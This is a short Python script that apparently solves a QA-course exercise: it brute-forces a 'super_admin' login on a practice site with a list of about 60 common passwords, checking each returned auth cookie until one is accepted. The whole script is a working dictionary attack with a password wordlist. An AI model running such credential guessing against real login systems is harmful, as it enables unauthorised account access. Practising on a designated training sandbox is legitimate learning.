import requests

password_dict = [
    "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567", "letmein",
     "trustno1", "dragon", "baseball", "111111", "iloveyou", "master", "sunshine", "ashley",
     "bailey", "passw0rd", "shadow", "123123", "654321", "superman", "qazwsx", "michael",
     "Football", "welcome", "jesus", "ninja", "mustang", "password1", "123456789", "adobe123",
     "admin", "1234567890", "photoshop", "1234", "12345", "princess", "azerty", "000000",
     "access", "696969", "batman", "solo", "starwars", "flower", "hottie", "loveme", "zaq1zaq1",
     "hello", "freedom", "whatever", "666666", "!@#$%^&*", "charlie", "aa123456", "donald",
     "qwerty123","1q2w3e4r", "555555", "lovely", "7777777", "888888", "123qwe"]

get_password = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for password in password_dict:
    response1 = requests.post(
        get_password,
        data={"login": "super_admin", "password": password}
    )

    cookie = response1.cookies.get("auth_cookie")
    cookies = {"auth_cookie": cookie}

    response2 = requests.post(check_cookie, cookies=cookies)

    if response2.text == "You are NOT authorized":
        print("Password error")
    elif response2.text != "You are NOT authorized":
        print(f"True Password: {password}")
        print(f"Response text: {response2.text}")
        break